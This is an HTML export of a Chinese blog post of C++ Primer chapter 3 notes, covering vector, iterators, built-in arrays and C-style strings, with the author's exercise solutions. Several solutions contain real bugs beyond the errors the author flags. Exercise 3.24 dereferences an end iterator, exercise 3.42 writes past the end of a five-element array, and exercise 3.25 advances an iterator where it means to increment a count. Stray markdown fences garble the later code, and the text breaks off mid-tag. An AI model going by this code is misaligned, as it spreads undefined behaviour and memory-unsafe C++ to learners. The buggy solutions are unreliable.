    <content type="html"><![CDATA[<h2 id="3-3：标准库类型-vector"><a href="#3-3：标准库类型-vector" class="headerlink" title="3.3：标准库类型 vector"></a>3.3：标准库类型 vector</h2><h3 id="定义和初始化vector"><a href="#定义和初始化vector" class="headerlink" title="定义和初始化vector"></a>定义和初始化vector</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;标准库类型vector表示对象的集合，其中所有对象的类型都相同，vector中容纳着其他对象，所以被称为容器。类似于c语言中的动态数组。</p><ul><li>1）引用不能成为vector的元素，因为引用不是对象（引用只是对象的别名）</li><li>2）可以使用花括号初始化每个值</li><li>3）使用括号指定元素个数或者相同元素值</li><li>4）根据类型编译器会决断括号内部含有的信息：vector <string> v7{10}   //V7有10个默认值</string></li><li>5) 初始化不准用赋值表达式<a id="more"></a><h3 id="向vector里面添加元素"><a href="#向vector里面添加元素" class="headerlink" title="向vector里面添加元素"></a>向vector里面添加元素</h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用vector.push_back()向里面添加对象。</li><li><p>练习3.14：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vector_num;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line">vector_num.push_back(num);</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习3.15:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> word;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vector_string;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; word)</div><div class="line">&#123;</div><div class="line">vector_string.push_back(word);</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="其他vector操作"><a href="#其他vector操作" class="headerlink" title="其他vector操作"></a>其他vector操作</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他几种vector操作</p><ul><li>v.empty()</li><li>v.size()</li><li>v1=v2</li><li><p>下标运算符可以用于访问已存在的元素，不能用于添加元素</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">for</span>(<span class="keyword">decltype</span>(ivec.<span class="built_in">size</span>()) ix=<span class="number">0</span>;ix!=<span class="number">10</span>;i++)</div><div class="line">&#123;</div><div class="line">ivec[ix]=ix;  <span class="comment">//严重错误</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习3.16:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="comment">//**需要注意的是里面的for关键字的用法**  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v1;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v2(<span class="number">10</span>);</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v3(<span class="number">10</span>,<span class="number">42</span>);</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v4&#123;<span class="number">10</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v5&#123;<span class="number">10</span>,<span class="number">42</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">string</span> &gt; v6&#123;<span class="number">10</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">string</span> &gt; v7&#123;<span class="number">10</span>,<span class="string">"hi"</span>&#125;;</div><div class="line"><span class="comment">//for (auto i : v2)</span></div><div class="line"><span class="comment">//cout &lt;&lt; i &lt;&lt; " ";</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; v2.size(); i++)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; v2[i] &lt;&lt; <span class="string">" "</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习3.17：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//    * vector里面存储的是string类型，string类型可以看做一个字符串，所以在内存中是以二维数组的形式存储的。  </span></div><div class="line"><span class="comment">//    * vector用**v.size()**来获取大小，string使用**s.length()**来获取长度。   </span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; My_vector;</div><div class="line"><span class="built_in">string</span> istring;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; istring)</div><div class="line">&#123;</div><div class="line">My_vector.push_back(istring);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; My_vector.size(); i++)</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; My_vector[i].length(); j++)   <span class="comment">//重点My_vector中的string类型的长度</span></div><div class="line">&#123;</div><div class="line">My_vector[i][j] = <span class="built_in">toupper</span>(My_vector[i][j]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; My_vector.size(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; My_vector[i] &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习 3.20</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num,j,i;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,j=nums.size()<span class="number">-1</span>; i &lt; nums.size()&amp;&amp;j&gt;=<span class="number">0</span>&amp;&amp;i&lt;=j; i++,j--)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (i == j)</div><div class="line">sum = nums[i];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i &lt; j)</div><div class="line">sum = sum + nums[i] + nums[j];</div><div class="line"><span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h2 id="3-4迭代器介绍"><a href="#3-4迭代器介绍" class="headerlink" title="3.4迭代器介绍"></a>3.4迭代器介绍</h2><h3 id="使用迭代器"><a href="#使用迭代器" class="headerlink" title="使用迭代器"></a>使用迭代器</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取迭代器不是使用取址指针，使用成员begin和成员end（）来返回第一个元素的迭代器和最后一个元素的迭代器。</p><ul><li>*item           //返回迭代器item所指向元素的引用</li><li>item-&gt;mem       //等价于（*item).mem</li><li>++iter          //指向下一个元素<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（<em>item).empty()和</em>item.empty()的区别在于前者是先对item解引用，然后在进行点运算符，后者是对item.empty（）成员解引用。后期，引进了箭头运算符，使得解引用和成员访问两个运算符结合在一起。即：item-&gt;empty()等价于（*item).empty()</li><li><p>练习3.22</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> word;</div><div class="line"><span class="built_in">vector</span> &lt;<span class="built_in">string</span>&gt; <span class="built_in">string</span>;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; word)</div><div class="line"><span class="built_in">string</span>.push_back(word);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">string</span>[<span class="number">1</span>].length(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">string</span>[<span class="number">1</span>][i] = <span class="built_in">toupper</span>(<span class="built_in">string</span>[<span class="number">1</span>][i]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; <span class="built_in">string</span>.size(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">string</span>[i] &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习2.23：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> item = nums.begin(); item != nums.end(); item++)</div><div class="line">&#123;</div><div class="line">*item *= <span class="number">2</span>;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; *item;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">```   </div><div class="line">* 练习<span class="number">3.24</span>:</div><div class="line">``` </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> nums_begin=nums.begin(),nums_end=nums.end();nums_begin!=nums_end;nums_begin++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; *nums_begin + *nums_end &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">nums_end--;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>练习3.25：利用偏移</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums(<span class="number">11</span>,<span class="number">0</span>);</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num &lt;= <span class="number">100</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">auto</span> item = nums.begin();   <span class="comment">//给与基地址</span></div><div class="line"><span class="keyword">auto</span> x = num / <span class="number">10</span>;           <span class="comment">//偏移地址</span></div><div class="line">item += x;</div><div class="line">*(item)++;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : nums)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h2 id="3-5数组"><a href="#3-5数组" class="headerlink" title="3.5数组"></a>3.5数组</h2><h3 id="1-定义和初始化内置数组"><a href="#1-定义和初始化内置数组" class="headerlink" title="1.定义和初始化内置数组"></a>1.定义和初始化内置数组</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下几个例子由内向外的阅读，以求明白其真实含义。例如int （*parray)[10]=&arr;首先看括号里面，这是一个指针，再看右边，这个指针指向的是大小为10的数组，在看左边，这个数组是一个int类型的.<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> *ptrs[<span class="number">10</span>]；           <span class="comment">//是一个含有十个整形指针的数组（指针数组）</span></div><div class="line"><span class="keyword">int</span> (*parray)[<span class="number">10</span>]=&amp;arr;   <span class="comment">//parray指向的是一个含有10个整数的数组</span></div><div class="line"><span class="keyword">int</span> (&amp;arrRef)[<span class="number">10</span>]=arr;    <span class="comment">//arrRef引用了一个含有十个整数的数组</span></div><div class="line"><span class="keyword">int</span> *(&amp;arry)[<span class="number">10</span>]=ptrs;    <span class="comment">//对于arry的引用，是一个10个指针的数组</span></div></pre></td></tr></table></figure></p><ul><li>练习3.31：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> nums[<span class="number">10</span>];</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</div><div class="line">nums[i] = i;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : nums)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; nums[i] &lt;&lt; <span class="string">" "</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="3-指针与数组"><a href="#3-指针与数组" class="headerlink" title="3.指针与数组"></a>3.指针与数组</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;begin()返回的是数组首元素的<strong>指针</strong>，end()返回的是数组<strong>尾元素下一个元素的指针</strong>，其中尾指针不能执行解引用和递增操作。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果两个指针分别指向不相干的对象，则不能比较他们。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指针加上一个整数还是一个指针，假设这个指针指向一个元素，则可以解引用这个指针。p=*(p+3);</p><ul><li>练习3.36<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> nums1[<span class="number">5</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</div><div class="line"><span class="keyword">int</span> nums2[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,&#125;;</div><div class="line"><span class="keyword">int</span> *q, *p;</div><div class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</div><div class="line"><span class="keyword">for</span> (p = nums1, q = nums2; p &lt; nums1 + <span class="number">5</span>&amp;&amp;q&lt;nums2+<span class="number">5</span>;p++,q++)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (*p != *q)</div><div class="line">&#123;</div><div class="line">flag = <span class="number">1</span>;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">" 相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">" 不相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="4-C语言风格字符串"><a href="#4-C语言风格字符串" class="headerlink" title="4.C语言风格字符串"></a>4.C语言风格字符串</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串和字符数组，<strong>不以空字符结束的产生严重错误。</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> str[]=<span class="string">"aedfefr"</span>；  <span class="comment">//字符串</span></div><div class="line"><span class="keyword">char</span> str2[]=&#123;<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'a'</span>,<span class="string">'\0'</span>&#125;   <span class="comment">//字符数组，必须要'\0'结尾</span></div><div class="line"><span class="comment">/*--------*/</span></div><div class="line"><span class="keyword">char</span> str[]=&#123;<span class="string">'a'</span>,<span class="string">'a'</span>&#125;;         <span class="comment">//没有\0结尾</span></div><div class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">strlen</span>(str)&lt;&lt;<span class="built_in">endl</span>;     <span class="comment">//严重错误</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#DC143C">使用string类型会更加安全。</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#DC143C">string对象加法中允许使用不多于1个的以空字符结尾的字符串类型。</font>例如：cout&lt;&lt;string&lt;&lt;+&lt;&lt;”ssss””;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能直接使用string来初始化char类型指针。<font color="#DC143C">可以使用c_str成员函数以返回c类型的字符串。</font><br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">string s;</div><div class="line"><span class="keyword">char</span> *<span class="keyword">str</span> = s；  <span class="comment">//不能直接使用string来初始化char类型指针</span></div><div class="line"><span class="keyword">char</span> *<span class="keyword">str</span> = s.c_str();</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#DC143C">使用数组来初始化vector对象，有两种方法，第一种是使用begin或者end标准库函数，第二种是使用地址指针。</font><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; ivec(begin(nums),end(nums));    <span class="comment">//使用标准库函数</span></div><div class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; ivec(nums,nums+<span class="number">4</span>);               <span class="comment">//使用指针</span></div></pre></td></tr></table></figure></p><p>练习3.39：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> str1 = <span class="string">"duehfuerhfuerh"</span>;</div><div class="line"><span class="built_in">string</span> str2 = <span class="string">"deuhdfuehfurhfuhr"</span>;</div><div class="line"><span class="keyword">if</span> (str1 == str2)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"两个字符串相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"两个字符串不相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> ch_str1[] = <span class="string">"wudheuhd"</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">char</span> ch_str2[] = <span class="string">"edbdferyf"</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(ch_str1, ch_str2) == <span class="number">0</span>)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"两个C语言字符串相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"两个C语言字符串不相等"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">```  </div><div class="line">练习<span class="number">3.40</span>:</div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    const char cstr1[5] = { ‘a’,’b’,’c’,’d’,’\0’ };  //一定要有终止符号<br>    const char cstr2[5] = { ‘e’,’f’,’g’,’h’,’\0’ };<br>    char cstr3[10] = { ‘\0’ };<br>    strcpy_s(cstr3, cstr1);<br>    strcat_s(cstr3, cstr2);<br>    cstr3[9] = ‘\0’;<br>    for (auto i : cstr3)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">练习3<span class="selector-class">.41</span>：</div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    int nums[4] = { 1,2,3,4 };<br>    vector &lt; int &gt; VectorNum(begin(nums), end(nums));<br>    for (auto i : VectorNum)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    cout &lt;&lt; endl;<br>    vector &lt; int &gt; VectorNum2(nums, nums + 4);<br>    for (auto i : VectorNum2)<br>        cout &lt;&lt; i &lt;&lt; “ “;<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">练习3<span class="selector-class">.42</span>：</div></pre></td></tr></table></figure></p><p>int main(void)<br>{<br>    vector <int> nums1 = { 1,2,3,4,5 };<br>    int nums2[5] = { 0 };<br>    for (auto i : nums1)<br>    {<br>        nums2[i] = i;<br>        cout &lt;&lt; nums2[i] &lt;&lt; endl;<br>    }<br>    system(“pause”);<br>    return 0;<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div 